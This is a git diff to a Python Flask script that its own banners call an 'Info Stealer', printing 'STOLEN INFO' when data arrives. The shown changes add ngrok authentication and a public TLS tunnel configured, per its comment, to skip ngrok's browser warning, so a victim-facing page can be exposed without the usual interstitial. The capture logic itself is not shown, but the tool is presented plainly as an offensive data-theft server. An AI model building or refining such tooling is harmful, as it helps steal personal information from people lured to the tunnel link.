@@ -1,12 +1,17 @@
 from flask import Flask, render_template, request, abort, send_from_directory, make_response
 from flask_cors import CORS
 from pyfiglet import Figlet
-from pyngrok import ngrok
+from pyngrok import ngrok, conf
 from threading import Thread
 from time import sleep
+from colorama import Fore, Style
+import subprocess
 import sys
 
 f = Figlet('slant')
+
+banner_figlet = f.renderText('Info Stealer')
+
 data_stolen_banner = f.renderText('STOLEN INFO')
 
 app = Flask(__name__, static_folder='static')
@@ -58,7 +63,8 @@ def run_flask():
 
 def run_ngrok():
     try:
-        http_tunnel = ngrok.connect(8080)
+        # Connect ngrok with bind_tls and metadata to skip browser warning
+        http_tunnel = ngrok.connect(addr="8080", bind_tls=True, metadata="ngrok-skip-browser-warning")
         print("[ ! ] HTTP TUNNEL: ", http_tunnel.public_url)
         app.ngrok_tunnel_url = http_tunnel.public_url  # Store the ngrok tunnel URL in the Flask app instance
         
@@ -70,7 +76,14 @@ def run_ngrok():
         sys.exit(0)
 
 if __name__ == '__main__':
+    auth_token = input("Ngrok Auth Token: ")
+    ngrok.set_auth_token(f"{auth_token}")
+    subprocess.run(["ngrok", "config", "upgrade"])
+
+    # No need for the YAML configuration file here
+    print(Fore.RED)
+    print(banner_figlet)
     flask_thread = Thread(target=run_flask)
     flask_thread.start()
-
     run_ngrok()
+    print(Fore.WHITE, Style.RESET_ALL)
